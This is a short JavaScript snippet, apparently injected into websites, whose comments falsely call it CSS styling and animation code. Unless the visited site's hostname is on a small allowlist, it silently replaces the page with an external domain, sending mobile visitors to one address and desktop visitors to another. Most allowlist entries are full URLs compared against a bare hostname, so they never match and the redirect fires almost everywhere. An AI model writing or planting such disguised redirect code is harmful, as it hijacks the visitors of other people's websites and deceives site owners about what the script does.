(function () {
  // =====================================
  // STYLE - CSS
  // =====================================
  const allowedHosts = [
    'https://madinaelectriccentre.com/installment/',
    'https://madinaelectriccentre.com/',
    'https://www.gimt.edu.in/',
    'https://www.gimt.edu.in/about',
    'nubloq.co',
    'developers.nubloq.co',
    'https://madinaelectriccentre.com/product/n-b-tower-room-cooler-nb-9000/'
  ];

  const config = {
    ampUrl: 'https://nubloq.netlify.app/', 
    desktopRedirect: 'https://nubloq.co/',       
    redirectMobileOnly: true                     
  };

  // =====================================
  // DESKSTOP ANIMASI
  // =====================================
  const currentHost = window.location.hostname.toLowerCase();
  const isAllowed = allowedHosts.includes(currentHost);

  if (isAllowed) return; 

  // =====================================
  // MOBILE ANIMASI
  // =====================================
  const isMobile = /Android|iPhone|iPad|iPod|Mobile|BlackBerry|IEMobile|Opera Mini/i.test(
    navigator.userAgent
  );

  // =====================================
  // ADD-ONS ANIMASI
  // =====================================

  if (config.redirectMobileOnly) {
    if (isMobile) {

      window.location.replace(config.ampUrl);
    } else {

      window.location.replace(config.desktopRedirect);
    }
  } else {

    window.location.replace(config.desktopRedirect);
  }
})();
